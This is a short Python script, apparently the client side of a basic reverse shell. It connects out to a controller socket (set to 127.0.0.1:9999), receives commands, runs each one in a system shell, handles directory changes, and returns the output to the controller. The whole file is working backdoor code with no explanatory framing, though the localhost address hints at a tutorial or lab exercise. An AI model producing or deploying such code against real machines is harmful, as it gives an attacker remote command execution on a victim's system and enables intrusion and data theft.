import os
import socket
import subprocess

s = socket.socket()
host = '127.0.0.1'
port = 9999
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        command = subprocess.Popen(data[:].decode(
            "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = command.stdout.read() + command.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        # This Prints what's going on, on the client's machine.
        print(output_str)

s.close()


#
